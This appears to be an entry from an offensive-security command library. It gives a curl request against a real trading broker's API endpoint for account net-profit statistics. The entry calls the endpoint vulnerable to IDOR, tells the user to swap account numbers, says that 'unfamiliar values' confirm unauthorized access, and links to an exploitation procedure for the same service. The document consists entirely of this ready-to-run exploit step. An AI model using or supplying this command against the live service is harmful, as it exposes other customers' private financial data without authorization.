---
id: cmd-net-profit-stats-001
data: >-
  curl -X GET
  "https://api.exness.com/v3/personal_area/stats/net_profit?time_range=365&accounts={accountNumber}"
  -H "Authorization: Bearer {token}" -H "Content-Type: application/json"
tags:
  - idor
  - api
  - exness
type: command
output: JSON with net profit data for the account
executor: bash
platforms:
  - Web
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:32:39.148Z'
verified: false
validated: true
submitted: true
---
# query-exness-net-profit-stats

## Command

```bash
curl -X GET "https://api.exness.com/v3/personal_area/stats/net_profit?time_range=365&accounts={accountNumber}" -H "Authorization: Bearer {token}" -H "Content-Type: application/json"
```

## Description

Fetches net profit statistics over a time range for a specified MT account, vulnerable to IDOR manipulation.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| accounts | Account ID to query | Yes |
| time_range | Days for data (365) | Yes |
| Authorization | Bearer token | Yes |

## Examples

### Basic Usage

```bash
curl -X GET "https://api.exness.com/v3/personal_area/stats/net_profit?time_range=365&accounts=xxx" -H "Authorization: Bearer eyJ..."
```

### Advanced Usage

```bash
curl -X GET "https://api.exness.com/v3/personal_area/stats/net_profit?time_range=365&accounts=xxx" -H "Authorization: Bearer {token}" --silent
```

## Expected Output

JSON net profit data, e.g., {"data": [{"date": "2023-01-01", "net_profit": 500.00}]}. Unauthorized access confirmed by unfamiliar values.

## Related

- [[commands/query-exness-equity-stats]]
- [[procedures/Exploit-IDOR-in-Exness-Stats-API]]
